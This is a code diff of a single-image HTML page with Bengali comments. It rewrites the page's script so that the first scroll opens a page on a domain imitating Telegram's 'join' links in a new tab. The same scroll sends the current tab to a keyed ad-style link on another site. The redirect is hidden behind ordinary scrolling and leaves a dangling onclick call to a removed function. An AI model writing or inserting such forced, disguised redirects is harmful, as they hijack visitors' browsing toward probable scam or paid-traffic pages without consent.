@@ -24,40 +24,25 @@ img{
 <img src="1stor.jpg" onclick="openLinks()">
 
     <script>
-let opened = false;
+let triggered = false;
 
-function openLinks() {
+window.addEventListener("scroll", function () {
 
-    if (opened) return;
-    opened = true;
+    // শুধু একবার কাজ করবে
+    if (triggered) return;
+    triggered = true;
 
-    // আগে নতুন ট্যাব ওপেন হবে
-    const newTab = window.open(
+    // নতুন ট্যাবে নতুন ওয়েবসাইট ওপেন
+    window.open(
         "https://tme-join.github.io/dgngbf/",
         "_blank"
     );
 
-    // তারপর বর্তমান ট্যাব রিডাইরেক্ট
-    setTimeout(() => {
-        window.location.href =
-            "https://tme-join.github.io/dgngbf/";
-    }, 100);
+    // বর্তমান ট্যাবে অন্য ওয়েবসাইট লোড
+    window.location.href = "https://sitefleck.com/qwpmezpg?key=ff4552c4f5069bba65ae8a584a919868";
 
-}
-
-// স্ক্রল শুরু হলেই ট্রিগার
-window.addEventListener(
-    "wheel",
-    openLinks,
-    { passive: true }
-);
-
-window.addEventListener(
-    "touchmove",
-    openLinks,
-    { passive: true }
-);
-</script>
-
+});
+    </script>
+    
 </body>
 </html>
